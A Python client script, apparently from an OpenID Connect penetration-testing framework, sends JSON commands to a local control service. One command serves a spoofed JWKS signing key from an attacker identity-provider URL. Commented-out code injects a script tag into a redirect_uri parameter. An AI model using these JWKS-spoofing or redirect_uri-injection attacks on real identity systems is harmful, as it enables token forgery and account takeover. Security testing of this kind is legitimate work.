import base64
import json
import socket
from urllib.parse import urlparse, quote

from time import sleep


class CMDDef:
    TYPE_CLEAR = "clear"
    TYPE_REQUEST = "request"

    QUERY_SEARCH_REPLACE = "querySearchReplace"
    JWKS_SPOOFING = "jwksSpoofing"


class ClearCommand:
    def __init__(self):
        self.type = CMDDef.TYPE_CLEAR


class ReplaceCommand:
    def __init__(self):
        self.type = CMDDef.TYPE_REQUEST
        self.action = CMDDef.QUERY_SEARCH_REPLACE
        self.uri = ""
        self.keyVal = {}

    def replaceKeyVal(self, key, value):
        self.keyVal[key] = quote(value)


class JWKSSpoof:
    def __init__(self):
        self.type = CMDDef.TYPE_REQUEST
        self.action = CMDDef.JWKS_SPOOFING
        self.uri = ""
        self.keys = [{
            "alg": "RS256",
            "e": "AQAB",
            "kid": "professos",
            "kty": "RSA",
            "n": "ygDpF9Ytx-TuTHao1msSDWnCSnl01p9k0VOVR9LRv4sSwcql8mFqjLEEnWfKnFmf_jm3a5lRBFpmq5PMh1BdGAQL8wMHmmlECz5vdBLo0hb0VUD_ynVnTpMxb7IscgqHw75aUiAajNJZGuLzuO9xlE1Ev2R41okZgof5nz-bMDqX83ZZzT0x_0l6poQdQ5eTRt9wdOASOgpMa8RRKOSVoygHGwtBI5J3YiVFG7ASGbum1Inime_KvjqCyE5NHbKncBzxMK6HWqZOdkBqvP9c77_a2vyemsDQAlabWjPwSITXNX7cT83kIFgQRWkifHhI34Cc1a8Irjzq-Z88Yan67w",
            "use": "sig",
            "x5c": [
                "MIIDQTCCAimgAwIBAgIBATANBgkqhkiG9w0BAQUFADBFMQswCQYDVQQGEwJkZTEMMAoGA1UECgwDUlVCMQwwCgYDVQQLDANORFMxGjAYBgNVBAMMEU9QSVYgVG9rZW4gU2lnbmVyMB4XDTE2MDIwOTIyMTAwMFoXDTIyMDIyNjExMTgyOFowRTELMAkGA1UEBhMCZGUxDDAKBgNVBAoMA1JVQjEMMAoGA1UECwwDTkRTMRowGAYDVQQDDBFPUElWIFRva2VuIFNpZ25lcjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMoA6RfWLcfk7kx2qNZrEg1pwkp5dNafZNFTlUfS0b+LEsHKpfJhaoyxBJ1nypxZn/45t2uZUQRaZquTzIdQXRgEC/MDB5ppRAs+b3QS6NIW9FVA/8p1Z06TMW+yLHIKh8O+WlIgGozSWRri87jvcZRNRL9keNaJGYKH+Z8/mzA6l/N2Wc09Mf9JeqaEHUOXk0bfcHTgEjoKTGvEUSjklaMoBxsLQSOSd2IlRRuwEhm7ptSJ4pnvyr46gshOTR2yp3Ac8TCuh1qmTnZAarz/XO+/2tr8nprA0AJWm1oz8EiE1zV+3E/N5CBYEEVpInx4SN+AnNWvCK486vmfPGGp+u8CAwEAAaM8MDowDAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUAHYjPGJEoudITkdiv5nW4jQqQxMwCwYDVR0PBAQDAgP4MA0GCSqGSIb3DQEBBQUAA4IBAQB2X+ev9MX3+8Cn1WImsEIid3d0apVwmcPqUxEiXls/+yNQvCZIZ+UtaMsBVTx8GzkPnJqJYrnpZe2ahMHOcq+yEA1QHMaGA33SYalf96UrgaE4vLDh0UHr5WnwXQg5R5lTe2VOEtKjEd8W8EUqiSzz+l07nrOJGFJPHZ5Ps7LuIBVaqLlbbDqm3ID9phLDqvx/baTrIW4JUJUaXbr1WSdp//xY8SpidoCL1pkbHKIJIE8vgg+xp+KnGiiWSnrx7BRczYaczGKSuvvXpUune55M57cFNzsA/yJMV/T11rmjwWoS497fVUQofJi0OS9zJtflx/xpZFJBctx9C1z3Ho5Y"
            ]
        }
        ]


def client(ip, port, message):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip, port))
        sock.sendall(bytes(message + "\n", 'ascii'))
        response = str(sock.recv(1024), 'ascii')
        print("Received: {}".format(response))


def command(cmd):
    data = json.dumps(cmd.__dict__)
    client(ip, port, data)


ip, port = "localhost", 8042

if __name__ == "__main__":
    command(ClearCommand())

    jwks = JWKSSpoof()
    jwks.uri = "https://attack-idp.professos/modauthopenidc/jwks"
    jwks.keys[0]["another"] = "abbbaa"

    keys = jwks.keys

    #print({ "keys": keys})

    command(jwks)
    #data = json.dumps(jwks.__dict__)
    #print(data)

    #cmd = ReplaceCommand()
    #cmd.uri = "mitreid-server/oidc-server/authorize"
    #cmd.replaceKeyVal("redirect_uri", '<script>"42"</script>')

    #command(cmd)
    #sleep(4)
    #command(ClearCommand())


